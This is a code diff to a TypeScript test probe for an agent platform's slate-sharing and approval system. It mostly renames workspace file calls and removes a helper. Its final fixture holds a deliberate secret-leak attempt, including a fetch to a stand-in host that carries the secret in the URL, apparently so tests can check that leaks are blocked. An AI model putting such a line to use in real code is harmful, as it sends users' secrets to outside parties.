@@ -16,7 +16,7 @@ import { PID_GEN_STRIDE } from '@nimbus-sh/core/runtime/process-table.js';
 import { PortRegistry } from '@nimbus-sh/core/runtime/port-registry.js';
 import { probeDurableApps, probeFacetManager } from './facet-manager';
 import {
-  agentCred, approvalKindOf, createProgramStateStore, initCodemodeStateTable, initUserTables, bearWorkspaceIdentity, bindActorHandle, DeferredApprovalQueue, DeferredApprovalStore, initWorkspaceSchema, openWorkspaceMainActor, WORKSPACE_IDENTITY_DDL,
+  agentCred, approvalKindOf, initUserTables, bearWorkspaceIdentity, bindActorHandle, DeferredApprovalQueue, DeferredApprovalStore, initWorkspaceSchema, openWorkspaceMainActor, WORKSPACE_IDENTITY_DDL,
   type ActorHandle, MissionGovernor, provisionAgentHome, settleSharedRoots, SHARE_SPEND_CAP_USD_PER_DAY, SlateOperationSchema,
   shareSpendLabel, type JsonValue, type ShareViewerClaim, type SlateCallResult, type SlateSurfaceResult, type SqlExec, type SqlExecutor, type SqlValue, actorHomeName } from '@kinu.run/core';
 import { SlateId } from '@agent-core/core/slates';
@@ -42,10 +42,10 @@ const MCP = [{ server: 'github', title: 'github', tools: [{ name: 'issue_read', 
 /** The triage slates, and what each calls as its owner runs it: `issues` hops into `triage-digest`, which hops back. */
 const TRIAGE = {
   issues: [
-    ['mcp', 'github', 'issue_read'], ['mcp', 'github', 'add_issue_comment'], ['readFile'], ['writeFile'],
+    ['mcp', 'github', 'issue_read'], ['mcp', 'github', 'add_issue_comment'], ['fs', 'text'], ['fs', 'write'],
     ['memory', 'recall'], ['memory', 'remember'], ['agent', 'send'], ['slates', 'triage-digest', 'summary'],
   ],
-  'triage-digest': [['readFile'], ['slates', 'issues', 'refresh']],
+  'triage-digest': [['fs', 'text'], ['slates', 'issues', 'refresh']],
   // What a slate never reaches: control of its calling agent, or making tools; and helpers, the owner's own slate's alone.
   overreach: [['agents', 'hire'], ['agent', 'hire'], ['workspace', 'createTool']],
 } as const;
@@ -93,7 +93,7 @@ const TYPIST = [
   '    const pieces = [];',
   '    for await (const piece of stream) {',
   '      pieces.push(piece);',
-  '      await this.env.workspace.writeFile("/typed", pieces.join(""));',
+  '      await this.env.workspace.fs.write("/typed", pieces.join(""));',
   '    }',
   '    return Response.json(pieces);',
   '  }',
@@ -151,9 +151,9 @@ const PROBE_WEB = createWebCodemodeProvider({
 /** A member a crafted tool reaches inside itself, weighed as codemode-tool.ts weighs it: admitted, or its refusal. */
 function reachedInside(context: SlateDispatchContext): string {
   try {
-    context.nested?.('workspace', 'writeFile');
+    context.nested?.('workspace', 'fs.write');
 
-    return 'admitted workspace.writeFile';
+    return 'admitted workspace.fs.write';
   } catch (cause) {
     return cause instanceof Error ? cause.message : String(cause);
   }
@@ -258,7 +258,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
         if (route.kind === 'agent' && route.ask === true) return { reply: typedPieces(['The ', 'agent ', 'says ', route.text], this.#typing.promise) };
 
         // The typist's word that it has text already: the model's last piece waits on it.
-        if (route.kind === 'namespace' && route.member === 'writeFile' && route.args[0] === '/typed') {
+        if (route.kind === 'namespace' && route.member === 'fs.write' && route.args[0] === '/typed') {
           this.#typing.resolve();
 
           return null;
@@ -277,7 +277,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
         }
 
         // A write a test holds where its dispatch prepares it, before the send, as an MCP call's credentials are read.
-        const hold = route.member === 'writeFile' ? this.#heldWrite : null;
+        const hold = route.member === 'fs.write' ? this.#heldWrite : null;
 
         if (hold !== null) {
           hold.reached.resolve();
@@ -289,9 +289,9 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
 
         if (route.namespace === 'web') return await callCodemodeMember([PROBE_WEB], 'web', route.member, route.args) ?? null;
 
-        if (route.member === 'readFile') return await this.#read(route.args[0], context);
+        if (route.member === 'fs.text') return await this.#read(route.args[0], context);
 
-        if (route.member === 'writeFile') this.#writes += 1;
+        if (route.member === 'fs.write') this.#writes += 1;
 
         return null;
       },
@@ -360,8 +360,8 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     files.writeFile(`${root}/server.ts`, [
       'import { SlateObject } from "kinu:slate";',
       'export class Slate extends SlateObject {',
-      '  async probe() { return await this.env.workspace.readFile("/x"); }',
-      '  async mutate() { return await this.env.workspace.writeFile("/x", "y"); }',
+      '  async probe() { return await this.env.workspace.fs.text("/x"); }',
+      '  async mutate() { return await this.env.workspace.fs.write("/x", "y"); }',
       '  async hop() { return await this.env.workspace.slates.digest.digest(); }',
       // Into the digest, which writes: a leaf of a slate the board's call hops to, held to the board's own bound.
       '  async hopWrite() { return await this.env.workspace.slates.digest.scribble(); }',
@@ -370,9 +370,9 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
       // Into the digest, which reads `/gate` (a test holds it there) and then calls its binding naming no request.
       '  async hopGated() { return await this.env.workspace.slates.digest.gatedRaw(); }',
       // A crafted tool of the owner's, which reaches another member inside itself while it runs.
-      '  async crafted() { return await this.env.workspace.readFile("/crafted"); }',
+      '  async crafted() { return await this.env.workspace.fs.text("/crafted"); }',
       // Straight to its binding, naming no request: the runner's wrapper is the slate's own code, never a boundary.
-      '  async raw() { const { env } = await import("cloudflare:workers"); const answer = await env.workspace.call(["writeFile"], ["/x", "raw"], null); if (!answer.ok) throw new Error(answer.error); return "raw wrote"; }',
+      '  async raw() { const { env } = await import("cloudflare:workers"); const answer = await env.workspace.call(["fs","write"], ["/x", "raw"], null); if (!answer.ok) throw new Error(answer.error); return "raw wrote"; }',
       '  async fetch() { return new Response("share-ok"); }',
       '}',
     ].join('\n'));
@@ -385,9 +385,9 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
       'import { SlateObject } from "kinu:slate";',
       'export class Slate extends SlateObject {',
       '  async digest() { return "digest-ok"; }',
-      '  async scribble() { return await this.env.workspace.writeFile("/x", "from digest"); }',
-      '  async rawWrite() { const { env } = await import("cloudflare:workers"); const answer = await env.workspace.call(["writeFile"], ["/x", "raw from digest"], null); if (!answer.ok) throw new Error(answer.error); return "raw wrote"; }',
-      '  async gatedRaw() { await this.env.workspace.readFile("/gate"); return await this.rawWrite(); }',
+      '  async scribble() { return await this.env.workspace.fs.write("/x", "from digest"); }',
+      '  async rawWrite() { const { env } = await import("cloudflare:workers"); const answer = await env.workspace.call(["fs","write"], ["/x", "raw from digest"], null); if (!answer.ok) throw new Error(answer.error); return "raw wrote"; }',
+      '  async gatedRaw() { await this.env.workspace.fs.text("/gate"); return await this.rawWrite(); }',
       '}',
     ].join('\n'));
     files.writeFile('/x', 'fixture-bytes');
@@ -509,12 +509,12 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
 
   /** A call a share's viewer makes with no invocation: the share must name the running call it rides. */
   async unnamedShareCall(share: string): Promise<SlateSurfaceResult> {
-    return this.host.surfaceCall({ caller: { ...ROOT_SLATE_CALLER, share }, id: SLATE_ID, name: 'workspace', lineage: this.lineageNow(SLATE_ID) }, { path: ['readFile'], args: ['/x'], invocation: null });
+    return this.host.surfaceCall({ caller: { ...ROOT_SLATE_CALLER, share }, id: SLATE_ID, name: 'workspace', lineage: this.lineageNow(SLATE_ID) }, { path: ['fs', 'text'], args: ['/x'], invocation: null });
   }
 
   /** The board as its owner runs it, so its graph names what a share can grant. */
   private async exerciseBoard(): Promise<void> {
-    for (const [path, args] of [[['readFile'], ['/x']], [['writeFile'], ['/x', 'fixture-bytes']], [['slates', 'digest', 'digest'], []]] as const) {
+    for (const [path, args] of [[['fs', 'text'], ['/x']], [['fs', 'write'], ['/x', 'fixture-bytes']], [['slates', 'digest', 'digest'], []]] as const) {
       await this.host.surfaceCall({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, name: 'workspace', lineage: this.lineageNow(SLATE_ID) }, { path: [...path], args: [...args], invocation: null });
     }
   }
@@ -799,13 +799,13 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
   preapproveWrites(): string[] {
     const revision = slateRevision(this.host.controller.builds, SLATE_ID) ?? '';
 
-    return this.host.controller.live.preapprove(SLATE_ID, { slate: SLATE_ID, namespace: 'workspace', member: 'writeFile', root: {}, revision });
+    return this.host.controller.live.preapprove(SLATE_ID, { slate: SLATE_ID, namespace: 'workspace', member: 'fs.write', root: {}, revision });
   }
 
   /** Its owner takes the board's standing approval of its writes back, from their share sheet. */
   async withdrawWrites(): Promise<void> {
     await this.host.controller.withdrawSlatePreapproval({
-      workspace: this.ctx.id.name ?? this.ctx.id.toString(), slate: SLATE_ID, entry: { slate: SLATE_ID, namespace: 'workspace', member: 'writeFile', root: {} },
+      workspace: this.ctx.id.name ?? this.ctx.id.toString(), slate: SLATE_ID, entry: { slate: SLATE_ID, namespace: 'workspace', member: 'fs.write', root: {} },
     });
   }
 
@@ -962,7 +962,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     if (admitted instanceof Response) throw new Error(`not admitted: ${admitted.status}`);
     this.host.controller.live.revoke(share);
 
-    return await this.host.surfaceCall({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, name: 'workspace', lineage: this.lineageNow(SLATE_ID) }, { path: ['readFile'], args: ['/x'], invocation: admitted.invocation });
+    return await this.host.surfaceCall({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, name: 'workspace', lineage: this.lineageNow(SLATE_ID) }, { path: ['fs', 'text'], args: ['/x'], invocation: admitted.invocation });
   }
 
   /**
@@ -1038,7 +1038,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
   }
 
   async replay(share: string): Promise<SlateSurfaceResult> {
-    return this.host.surfaceCall({ caller: { ...ROOT_SLATE_CALLER, share }, id: SLATE_ID, name: 'workspace', lineage: this.lastLineage ?? this.lineageNow(SLATE_ID) }, { path: ['readFile'], args: ['/x'], invocation: this.lastCall });
+    return this.host.surfaceCall({ caller: { ...ROOT_SLATE_CALLER, share }, id: SLATE_ID, name: 'workspace', lineage: this.lastLineage ?? this.lineageNow(SLATE_ID) }, { path: ['fs', 'text'], args: ['/x'], invocation: this.lastCall });
   }
 
   async requests(share: string): Promise<SlateCallResult> {
@@ -1075,25 +1075,6 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
 
     try {
       return { found: rosterPage(this.ctx.storage.sql, { query: q }).entries.map((entry) => entry.displayName) };
-    } catch (cause) {
-      return { failed: cause instanceof Error ? cause.message : String(cause) };
-    }
-  }
-
-  /** An agent program's state in this object's own SQLite, holding `key`: the keys it lists under `prefix`, or the failure. */
-  programStateList(key: string, prefix: string): { found: string[] } | { failed: string } {
-    initCodemodeStateTable((ddl) => { this.ctx.storage.sql.exec(ddl); });
-
-    // Tagged statements over this object's SQLite, as an agent's database binds them.
-    const sql: SqlExecutor = <T,>(query: TemplateStringsArray, ...values: SqlValue[]): T[] =>
-      this.ctx.storage.sql.exec<Extract<T, Record<string, SqlStorageValue>>>(query.join('?'), ...values).toArray();
-
-    const state = createProgramStateStore(sql, 'probe-actor', () => undefined);
-
-    state.set(key, 'probe');
-
-    try {
-      return { found: state.list(prefix) };
     } catch (cause) {
       return { failed: cause instanceof Error ? cause.message : String(cause) };
     }
@@ -1286,7 +1267,7 @@ const NOTES_SOURCE = [
   '    const read = await issue(this.env);',
   '    const ways = {',
   '      storage: await tried(this.storage.put("leak", read.secret)),',
-  '      file: await tried(this.env.workspace.writeFile("/leak", read.secret)),',
+  '      file: await tried(this.env.workspace.fs.write("/leak", read.secret)),',
   '      network: await tried(fetch("https://author.example/?d=" + read.secret)),',
   '      slates: await tried(this.env.workspace.slates.notes.board()),',
   '      browser: await tried(this.env.workspace.web.connectBrowser("kitesurf")),',
